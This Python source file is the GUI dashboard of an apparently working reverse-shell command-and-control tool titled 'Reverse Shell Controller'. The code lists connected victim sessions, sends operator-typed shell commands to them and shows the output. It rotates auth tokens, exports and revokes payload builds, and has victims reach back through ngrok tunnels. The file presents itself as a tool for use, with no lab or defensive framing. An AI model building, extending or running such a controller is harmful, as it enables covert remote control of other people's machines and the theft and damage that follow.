#!/usr/bin/env python3
"""
Dashboard - Main window with rotating auth
"""
import threading
import tkinter as tk
from tkinter import scrolledtext
from datetime import datetime

from dashboard.theme import Theme
from dashboard.widgets import Sidebar
from core.config import Config
from core.logger import get_logger
from core.session_manager import SessionManager
from core.server_state import ServerState
from modules.server import Server
from exporter.export_manager import ExportManager, _PROJECT_ROOT


class Dashboard:
    """Main dashboard window"""

    def __init__(self, root):
        self.root = root
        self.log = get_logger('dashboard')

        self.config = Config()
        self.theme = Theme(self.config.theme)
        self.sessions = SessionManager()

        # Rotating auth config
        self.server_state = ServerState(migration_secret=self.config.auth_secret)
        self.server = Server(
            host=self.config.host,
            port=self.config.port,
            server_state=self.server_state,
            rotation_seconds=self.config.rotation_seconds,
            grace_windows=self.config.grace_windows,
            session_manager=self.sessions,
        )
        self._wire_server_callbacks()

        self._setup_window()
        self._build_ui()

        self.log_info("[*] Dashboard started")
        self.log_info(f"[*] Server target: {self.config.host}:{self.config.port}")
        self.log_info(f"[*] Rotation: {self.config.rotation_seconds}s")
        stats = self.server_state.get_registry_stats()
        if stats["total"]:
            stale_note = f" ({stats['stale']} stale)" if stats["stale"] else ""
            self.log_info(f"[*] Registry: {stats['total']} payloads{stale_note}")

    def _wire_server_callbacks(self):
        self.server.on_log = self._on_server_log
        self.server.on_client_connected = self._on_client_connected
        self.server.on_client_disconnected = self._on_client_disconnected
        self.server.on_client_message = self._on_client_message
        self.server.on_token_rotated = self._on_token_rotated

    def _setup_window(self):
        self.root.title("🛸 Reverse Shell Controller")
        self.root.geometry(
            f"{self.config.get('dashboard', 'window_width')}x"
            f"{self.config.get('dashboard', 'window_height')}"
        )
        self.root.configure(bg=self.theme['bg_primary'])
        self.root.minsize(1000, 600)

    def _build_ui(self):
        self.main_frame = tk.Frame(self.root, bg=self.theme['bg_primary'])
        self.main_frame.pack(fill=tk.BOTH, expand=True, padx=15, pady=15)

        self._build_header()
        self._build_token_bar()

        self.content_frame = tk.Frame(self.main_frame, bg=self.theme['bg_primary'])
        self.content_frame.pack(fill=tk.BOTH, expand=True, pady=(12, 0))

        self.sidebar = Sidebar(
            self.content_frame, self.theme,
            on_select=self._on_session_select,
        )
        self.sidebar.listbox.bind('<Button-3>', self._on_session_right_click)

        self._build_terminal()
        self._build_command_input()

    def _build_header(self):
        header = tk.Frame(self.main_frame, bg=self.theme['bg_primary'])
        header.pack(fill=tk.X, pady=(0, 8))

        title = tk.Label(
            header, text="🛸 Reverse Shell Controller",
            font=('Segoe UI', 20, 'bold'),
            fg=self.theme['accent_light'],
            bg=self.theme['bg_primary'],
        )
        title.pack(side=tk.LEFT)

        version = tk.Label(
            header, text="v2.0",
            font=('Segoe UI', 11), fg=self.theme['text_muted'],
            bg=self.theme['bg_primary'],
        )
        version.pack(side=tk.LEFT, padx=(12, 0))

        controls = tk.Frame(header, bg=self.theme['bg_primary'])
        controls.pack(side=tk.RIGHT)

        self.server_btn = tk.Button(
            controls, text="▶ Start Server",
            command=self._toggle_server,
            bg=self.theme['success'], fg='#ffffff',
            activebackground=self.theme['bg_hover'],
            activeforeground=self.theme['text_primary'],
            relief='flat', padx=12, pady=6,
            font=('Segoe UI', 10, 'bold'), cursor='hand2',
        )
        self.server_btn.pack(side=tk.LEFT, padx=(0, 8))

        self.theme_btn = tk.Button(
            controls, text="☀️ Light Mode",
            command=self._toggle_theme,
            bg=self.theme['bg_tertiary'], fg=self.theme['text_primary'],
            activebackground=self.theme['bg_hover'],
            activeforeground=self.theme['text_primary'],
            relief='flat', padx=12, pady=6,
            font=('Segoe UI', 10), cursor='hand2',
        )
        self.theme_btn.pack(side=tk.LEFT, padx=(0, 8))

        # Export Payload dropdown
        self.export_btn = tk.Menubutton(
            controls, text="📦 Export Payload ▾",
            bg=self.theme['accent_primary'], fg='#ffffff',
            activebackground=self.theme['bg_hover'],
            activeforeground=self.theme['text_primary'],
            relief='flat', padx=12, pady=6,
            font=('Segoe UI', 10, 'bold'), cursor='hand2',
        )
        self.export_menu = tk.Menu(
            self.export_btn, tearoff=0,
            bg=self.theme['menu_bg'], fg=self.theme['menu_fg'],
            activebackground=self.theme['menu_active_bg'],
            activeforeground=self.theme['menu_active_fg'],
            bd=0,
        )
        for fmt in ExportManager.formats():
            self.export_menu.add_command(
                label=fmt.upper(),
                command=lambda f=fmt: self._on_export(f),
            )
        self.export_btn['menu'] = self.export_menu
        self.export_btn.pack(side=tk.LEFT, padx=(0, 12))

        status_frame = tk.Frame(controls, bg=self.theme['bg_primary'])
        status_frame.pack(side=tk.LEFT)

        self.status_dot = tk.Canvas(
            status_frame, width=14, height=14,
            bg=self.theme['bg_primary'], highlightthickness=0,
        )
        self.status_dot.pack(side=tk.LEFT, padx=(0, 8))
        self.status_dot.create_oval(
            2, 2, 12, 12, fill=self.theme['error'], tags='status'
        )

        self.status_label = tk.Label(
            status_frame, text="Server: Stopped",
            font=('Segoe UI', 10), fg=self.theme['text_secondary'],
            bg=self.theme['bg_primary'],
        )
        self.status_label.pack(side=tk.LEFT)

    def _build_token_bar(self):
        """Show current rotating token"""
        token_frame = tk.Frame(self.main_frame, bg=self.theme['bg_secondary'])
        token_frame.pack(fill=tk.X, pady=(0, 8), ipady=6)

        label = tk.Label(
            token_frame, text="🔑 Current Token:",
            font=('Segoe UI', 10, 'bold'),
            fg=self.theme['accent_light'],
            bg=self.theme['bg_secondary'],
        )
        label.pack(side=tk.LEFT, padx=(10, 5))

        self.token_label = tk.Label(
            token_frame, text="(server not running)",
            font=('Consolas', 11, 'bold'),
            fg=self.theme['success'],
            bg=self.theme['bg_secondary'],
        )
        self.token_label.pack(side=tk.LEFT, padx=(0, 15))

        self.rotation_label = tk.Label(
            token_frame, text="",
            font=('Segoe UI', 9),
            fg=self.theme['text_muted'],
            bg=self.theme['bg_secondary'],
        )
        self.rotation_label.pack(side=tk.LEFT)

        self.copy_btn = tk.Button(
            token_frame, text="📋 Copy",
            command=self._copy_token,
            bg=self.theme['bg_tertiary'],
            fg=self.theme['text_primary'],
            activebackground=self.theme['bg_hover'],
            activeforeground=self.theme['text_primary'],
            relief='flat', padx=8, pady=2,
            font=('Segoe UI', 9), cursor='hand2',
        )
        self.copy_btn.pack(side=tk.RIGHT, padx=10)

    def _copy_token(self):
        if self.server.running:
            token = self.server.get_current_token()
            self.root.clipboard_clear()
            self.root.clipboard_append(token)
            self._log(f"[*] Copied token: {token[:8]}...", 'info')

    def _build_terminal(self):
        terminal_frame = tk.LabelFrame(
            self.content_frame, text="💻 Terminal",
            fg=self.theme['text_primary'], bg=self.theme['bg_primary'],
            bd=1, relief='solid',
        )
        terminal_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)

        container = tk.Frame(terminal_frame, bg=self.theme['bg_primary'])
        container.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        self.terminal = scrolledtext.ScrolledText(
            container, wrap=tk.WORD,
            font=('Consolas', 10),
            bg=self.theme['terminal_bg'],
            fg=self.theme['terminal_green'],
            insertbackground=self.theme['terminal_green'],
            borderwidth=0, highlightthickness=0, relief='flat',
        )
        self.terminal.pack(fill=tk.BOTH, expand=True)

        self.terminal.tag_configure('error', foreground=self.theme['error'])
        self.terminal.tag_configure('success', foreground=self.theme['success'])
        self.terminal.tag_configure('warning', foreground=self.theme['warning'])
        self.terminal.tag_configure('info', foreground=self.theme['accent_cyan'])
        self.terminal.tag_configure('highlight', foreground=self.theme['accent_light'])

    def _build_command_input(self):
        bottom = tk.Frame(self.main_frame, bg=self.theme['bg_primary'])
        bottom.pack(fill=tk.X, pady=(12, 0))

        prompt = tk.Label(
            bottom, text=">",
            font=('Consolas', 14, 'bold'),
            fg=self.theme['accent_cyan'],
            bg=self.theme['bg_primary'],
        )
        prompt.pack(side=tk.LEFT, padx=(0, 10))

        self.cmd_entry = tk.Entry(
            bottom, font=('Consolas', 11),
            bg=self.theme['bg_input'],
            fg=self.theme['text_primary'],
            insertbackground=self.theme['text_primary'],
            relief='solid', bd=1,
        )
        self.cmd_entry.pack(side=tk.LEFT, fill=tk.X, expand=True)
        self.cmd_entry.bind('<Return>', lambda e: self._on_command())

    def _on_export(self, fmt):
        """Export client/client.py as ``fmt`` into builds/ (runs in a thread)."""
        def do_export():
            try:
                path = ExportManager().export(fmt, output_dir="builds/")
                size = path.stat().st_size
                try:
                    rel = path.relative_to(_PROJECT_ROOT)
                except ValueError:
                    rel = path
                self.root.after(
                    0,
                    lambda: self._log(
                        f"[+] Exported {fmt} payload → {rel} ({size} bytes)",
                        'success',
                    ),
                )
            except Exception as e:
                self.root.after(
                    0,
                    lambda: self._log(
                        f"[-] Export {fmt} failed: {e}", 'error'
                    ),
                )
        threading.Thread(target=do_export, daemon=True).start()

    def _on_server_log(self, message, tag):
        self._log(message, tag)

    def _on_client_connected(self, session):
        self._log(f"[+] Session #{session.id:04d} connected: {session.address}", 'success')
        self.refresh_sessions()

    def _on_client_disconnected(self, session):
        self._log(f"[-] Session #{session.id:04d} disconnected: {session.address}", 'warning')
        self.refresh_sessions()

    def _on_client_message(self, session, message):
        self._log(f"[{session.id:04d}] {message}", 'info')

    def _on_token_rotated(self, new_token):
        self.root.after(0, lambda: self._update_token_display(new_token))

    def _update_token_display(self, token=None):
        if self.server.running:
            if token is None:
                token = self.server.get_current_token()
            self.token_label.config(text=token)
            info = self.server.get_token_info()
            self.rotation_label.config(
                text=f"(next rotation in {info['expires_in']}s)"
            )
        else:
            self.token_label.config(text="(server not running)")
            self.rotation_label.config(text="")

    def _on_session_select(self, index):
        sessions = self.sessions.all()
        if index < len(sessions):
            self.log_info(f"[*] Selected: {sessions[index]}")

    def _on_session_right_click(self, event):
        """Right-click context menu on a session row."""
        index = self.sidebar.listbox.nearest(event.y)
        if index < 0:
            return
        sessions = self.sessions.all()
        if index >= len(sessions):
            return
        session = sessions[index]

        menu = tk.Menu(self.root, tearoff=0,
                       bg=self.theme['menu_bg'], fg=self.theme['menu_fg'],
                       activebackground=self.theme['menu_active_bg'],
                       activeforeground=self.theme['menu_active_fg'])
        uuid = getattr(session, 'payload_uuid', None)
        if uuid:
            menu.add_command(
                label=f"Revoke payload {uuid[:8]}...",
                command=lambda: self._revoke_session(session),
            )
        else:
            menu.add_command(
                label="(legacy session — no payload)",
                state=tk.DISABLED,
            )
        menu.add_separator()
        menu.add_command(
            label="Disconnect session",
            command=lambda: self._disconnect_session(session),
        )
        try:
            menu.tk_popup(event.x_root, event.y_root)
        finally:
            menu.grab_release()

    def _revoke_session(self, session):
        uuid = getattr(session, 'payload_uuid', None)
        if not uuid:
            self._log("[!] Legacy session — cannot revoke payload", 'warning')
            return
        if self.server_state.revoke_payload(uuid):
            self._log(f"[*] Revoked payload {uuid[:8]}...", 'success')
            self._disconnect_session(session)
        else:
            self._log(f"[!] Payload {uuid[:8]}... not in registry", 'warning')

    def _disconnect_session(self, session):
        self.sessions.set_active(session.id, False)
        try:
            session.socket.close()
        except Exception:
            pass
        self._log(f"[*] Disconnected session #{session.id:04d}", 'info')

    def _on_command(self):
        cmd = self.cmd_entry.get().strip()
        if not cmd:
            return
        self.cmd_entry.delete(0, tk.END)

        index = self.sidebar.get_selected_index()
        if index is None:
            self._log("[!] No session selected", 'error')
            return

        sessions = self.sessions.all()
        if index >= len(sessions):
            return

        session = sessions[index]
        self._log(f"$ {cmd}", 'highlight')

        def send():
            ok, output = self.server.send_command(session.id, cmd)
            if ok:
                self.root.after(0, lambda: self._log(output, 'info'))
            else:
                self.root.after(0, lambda: self._log(f"[!] {output}", 'error'))

        threading.Thread(target=send, daemon=True).start()

    def _toggle_server(self):
        if self.server.running:
            self.server.stop()
            self.server_btn.config(text="▶ Start Server", bg=self.theme['success'])
            self.status_dot.itemconfig('status', fill=self.theme['error'])
            self.status_label.config(text="Server: Stopped")
            self.token_label.config(text="(server not running)")
            self.rotation_label.config(text="")
        else:
            if self.server.start():
                self.server_btn.config(text="⏹ Stop Server", bg=self.theme['error'])
                self.status_dot.itemconfig('status', fill=self.theme['success'])
                self.status_label.config(
                    text=f"Server: Running on {self.server.host}:{self.server.port}"
                )
                self._update_token_display()
                self._log(
                    f"[*] Ngrok: run 'ngrok tcp {self.server.port}' to expose this",
                    'info',
                )
                self._log(
                    f"[*] Client will auto-scan *.tcp.eu.ngrok.io",
                    'info',
                )
                # Start token refresh loop for display
                self._schedule_token_refresh()

    def _schedule_token_refresh(self):
        """Update token countdown every 5s"""
        if not self.server.running:
            return
        self._update_token_display()
        self.root.after(5000, self._schedule_token_refresh)

    def _toggle_theme(self):
        new_theme = self.theme.toggle()
        self.theme_btn.config(
            text="☀️ Light Mode" if new_theme == 'dark' else "🌙 Dark Mode"
        )
        self.log_info(f"[*] Theme: {new_theme}")

    def log_info(self, msg):
        self._log(msg, 'info')

    def _log(self, msg, tag=None):
        timestamp = datetime.now().strftime("%H:%M:%S")
        line = f"[{timestamp}] {msg}\n"
        if tag and tag in self.terminal.tag_names():
            self.terminal.insert(tk.END, line, tag)
        else:
            self.terminal.insert(tk.END, line)
        self.terminal.see(tk.END)

    def refresh_sessions(self):
        self.sidebar.update_sessions(self.sessions.all())
